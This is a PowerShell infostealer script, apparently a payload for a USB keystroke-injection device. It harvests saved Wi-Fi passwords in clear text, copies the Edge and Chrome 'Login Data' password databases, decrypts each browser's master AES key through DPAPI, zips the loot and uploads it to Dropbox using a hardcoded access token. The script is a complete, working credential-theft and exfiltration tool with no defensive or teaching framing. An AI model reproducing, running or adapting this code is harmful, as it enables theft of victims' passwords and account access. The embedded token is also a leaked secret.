# $DRIVE = 'CURCUITPY'

# $duckletter = Get-WmiObject -Class Win32_Volume | Where-Object { $_.Label -eq $DRIVE } | Select-Object -ExpandProperty Name


# $destinationDir = "$duckletter\$env:USERNAME"

$TempPath = [System.IO.Path]::GetTempPath()
$FolderName = "$env:USERNAME-Hellow/hi"
$destinationDir = Join-Path -Path $TempPath -ChildPath $FolderName

Add-Type -AssemblyName System.Security


# Create the destination directory if it doesn't exist
if (-not (Test-Path -Path $destinationDir)) {
    New-Item -ItemType Directory -Path $destinationDir | Out-Null
}

function GetWifiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }

    $results = @()

    foreach ($profile in $wifiProfiles) {
        $profileDetails = netsh wlan show profile name="$profile" key=clear
        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
        $results += [PSCustomObject]@{
            ProfileName = $profile
            KeyContent  = $keyContent
        }
    }

    $results | Format-Table -AutoSize

    # Save results to a file
    $results | Out-File -FilePath "$destinationDir\WiFi_Details.txt"
}

GetWifiPasswords

# Function to copy Login Data file
function Copy-LoginData {
    param (
        [string]$browserName,
        [string]$browserDataPath
    )

    $browserDir = Join-Path -Path $destinationDir -ChildPath $browserName
    if (-not (Test-Path -Path $browserDir)) {
        New-Item -ItemType Directory -Path $browserDir | Out-Null
    }

    # Copy Login Data file
    $loginDataPath = Join-Path -Path $browserDataPath -ChildPath "Default\Login Data"
    if (Test-Path -Path $loginDataPath) {
        Copy-Item -Path $loginDataPath -Destination $browserDir -Force
        Write-Output "$browserName Copied Login Data to $browserDir"
    } else {
        Write-Output "$browserName Login Data file not found."
    }
}

# Function to decrypt AES key from Local State
function Get-DecryptedAESKey {
    param (
        [string]$browserName,
        [string]$localStatePath
    )

    $browserDir = Join-Path -Path $destinationDir -ChildPath $browserName
    if (-not (Test-Path -Path $browserDir)) {
        New-Item -ItemType Directory -Path $browserDir | Out-Null
    }

    # Read and parse the Local State file
    $localStateContent = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json

    # Extract and decode the encrypted key
    $encryptedKey = $localStateContent.os_crypt.encrypted_key
    $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)

    # Remove the first 5 bytes (DPAPI prefix) and decrypt the key
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)],
        $null,
        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    )

    # Convert the decrypted key to Base64 and save it to a file
    $decryptedKeyBase64 = [System.Convert]::ToBase64String($decryptedKey)
    $outputPathAES = Join-Path -Path $browserDir -ChildPath "AES.txt"
    Set-Content -Path $outputPathAES -Value $decryptedKeyBase64

    Write-Output "$browserName Decrypted AES Key saved to $outputPathAES"
    Write-Output "$browserName Decrypted AES Key: $decryptedKeyBase64"
}

# Process Microsoft Edge
$edgeDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$edgeLocalStatePath = Join-Path -Path $edgeDataPath -ChildPath "Local State"

Copy-LoginData -browserName "Edge" -browserDataPath $edgeDataPath
Get-DecryptedAESKey -browserName "Edge" -localStatePath $edgeLocalStatePath

# Process Google Chrome
$chromeDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$chromeLocalStatePath = Join-Path -Path $chromeDataPath -ChildPath "Local State"

Copy-LoginData -browserName "Chrome" -browserDataPath $chromeDataPath
Get-DecryptedAESKey -browserName "Chrome" -localStatePath $chromeLocalStatePath

Write-Output "All files and keys saved to: $destinationDir"

$FolderName2 = "$env:USERNAME-Hellow/hi.zip"
$destinationZip = Join-Path -Path $TempPath -ChildPath $FolderName2
Compress-Archive -Path $destinationDir -DestinationPath $destinationZip

function UploadZipToDropbox {
    param (
        [string]$SourceFilePath,
        [string]$TargetFilePath,
        [string]$AccessToken
    )

    $url = "https://content.dropboxapi.com/2/files/upload"
    $headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Dropbox-API-Arg" = (@{
            path = $TargetFilePath
            mode = "add"
            autorename = $true
            mute = $false
        } | ConvertTo-Json -Depth 10 -Compress)
        "Content-Type" = "application/octet-stream"
    }
    

    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $SourceFilePath
}

# Example usage:
$AccessToken = "sl.u.AFmdA3ircS-rlf1arij-4pHVcMXi7i9wTopmzxeE7_newbVMFeYMlteXnjpD3zjk5QXq87rN6Pti_GpHfzGDPzDFQK6eb_kxT1bHj6m2ObTG3BS17_0EyHNJMCzO4x0fy6z46bpzUxzx3Xy45P6L5sPHiTpYIBt0IumfeDp262klobiRF4CODbnt1O64m_CoQM6MhTzdQtW1pdtzeMqd3EPHGLRw3mkPkv0JmvDlkJ0mNXMKzKiV-3URXKJppEseFweYX35O9NRRAxo-a9Y3cHJSsJLIhWt99TKlC8kjgJOcPcpTrZPQhVvd5sPCioGGz1bkQCzqc_rGz-t0sw5TKR_54xGerO9vzpnWGNQrbXoI_mXFk6pQY5MJRsi423bt5hfSJg3a2xB6SLaKqkDp9jSltHwCLUExu-xuSvdmGC2tlcFAo7_MzdCD5eU4LrULzqjdPAoAS2xMo1-PN0gFDoeWwE_q9xn5TCbC6VpxqR7B2cR4eM-1p8jyzCYu_EPuVbI7eIIn6sJOWLzHRNSSsuNA-h8CFxBEocn-af8cYyZaR6wvceAQ7V5QEynndlqZStSAfwTTwda7JNzpT0o2WTj8A2lDYFhVpo99d3mRZ9WDqidmnKcbB1r_jYCk4vZR3CQACIsjBJoA4xhUeYrVIim51ONg6aRqOFu6llEoP2s3cdSDShy8PBnGy4sRM9hgUFGEGjj71L0G4eKj6KEKdeqqorKJRbW7z7er-k3kIE-4oKfMWVWt_xeajzWFTOmN_sjJYy9sil8dZsWsyIG4TAanx4KdhpWmBlMwT9JQ9oHHtxsceh4EGhsaOE2UbezDgW3KtgABQeLa3JNq3UwAi4cDv0CWBfwE0J1jxxy_2s3l6ye5pzHZLWLXOkMbdglFSHfQfGykNDvmnUxkT2ZQ8bzV94ZLknGfRffPVPlr-PjTipIgpZUUkj3Roth2z4-snTVCwZcsNRmTtuDMNJOoUMc9H2G52qQkIewz1K6qjX0ZjAyz7lw1NLQxwlKk9rzAp1swwlYZSOpPmP8_bBMb5iwuyqd-xwlytPfGsQqC0S56vqPrWUFChFdQyiraT6HYaMga8D3Md8zKI2PvDKP9aSp7LF_5SUDEECi9XKBoeRnXEiG5nuvTHicgQbkvVhcx5KxAWxCtACbaNvGfdH-V5o2o5sI_go-BW48XZid8V89gAu83wEhhnEr1p8fD4VuMPahQnsFpwBSBcxrui8QIlVV5tZXsn_6_Le9VNyEtqn2hvFZQI-jVOd6rCT7DXgiZIK9t2R0TDH-M4JtA6xLlnCbA2ziiXDzNTFGPs3RMXT4vmzlEHz-6fBuYqXBX2lC0wtGtgDxJczKdFAv_64PoHlxKwcLA5P3tx7cxYJVUSrVrQ7t6HvbRwBbRRmXR6a7MhZUySQX9e30MVMnAAWamRVjE"
$currentDate = Get-Date -Format "yyyy-MM-dd"
$currentTime = Get-Date -Format "HH:mm:ss"
$TargetFilePath = "/$env:USERNAME-$currentDate-$currentTime.zip"

UploadZipToDropbox -SourceFilePath $destinationZip -TargetFilePath $TargetFilePath -AccessToken $AccessToken